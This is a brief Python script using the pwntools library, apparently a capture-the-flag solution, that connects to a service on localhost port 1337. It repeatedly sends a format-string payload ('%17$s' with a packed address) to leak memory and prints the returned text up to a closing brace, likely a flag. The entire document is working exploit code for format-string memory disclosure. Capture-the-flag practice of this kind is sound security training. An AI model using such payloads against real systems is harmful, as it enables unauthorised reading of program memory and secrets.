from pwn import *

p = remote('127.0.0.1', 1337)

for i in range(20):
	p.sendline(b'B%17$sAA' + p64(0x402008))

p.recvuntil(b'Answer: B')
print(p.recvuntil(b'}'))
